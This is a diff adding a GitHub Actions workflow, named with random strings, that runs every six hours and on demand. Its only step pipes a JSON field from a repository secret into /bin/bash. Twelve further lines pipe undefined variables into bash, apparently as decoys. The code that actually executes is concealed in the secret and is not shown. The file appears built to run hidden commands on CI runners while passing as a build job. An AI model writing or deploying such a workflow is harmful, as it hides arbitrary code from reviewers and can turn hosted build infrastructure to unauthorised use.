@@ -1,0 +1,30 @@
+name: nakendingesyw
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nakendingesyw
+        env:
+          c51998: ${{ secrets.c51998 }}
+        run: |
+          echo $c51998 | jq -r .ps41 | /bin/bash
+          echo $fg388 | jq -r .jlwdx3081 | /bin/bash
+          echo $jmgvc0 | jq -r .cyhmk53 | /bin/bash
+          echo $aagxw1 | jq -r .pl1755 | /bin/bash
+          echo $zfidx9013 | jq -r .ygsd6 | /bin/bash
+          echo $vt55159 | jq -r .ycecn36044 | /bin/bash
+          echo $xlxjb0029 | jq -r .atau5 | /bin/bash
+          echo $ne4 | jq -r .jtn0 | /bin/bash
+          echo $x3506 | jq -r .anddj0235 | /bin/bash
+          echo $jskfl38321 | jq -r .rve0 | /bin/bash
+          echo $qyjep34 | jq -r .ewzts3 | /bin/bash
+          echo $ul850 | jq -r .kvyll9 | /bin/bash
+          echo $yxoh9 | jq -r .vg2 | /bin/bash
+
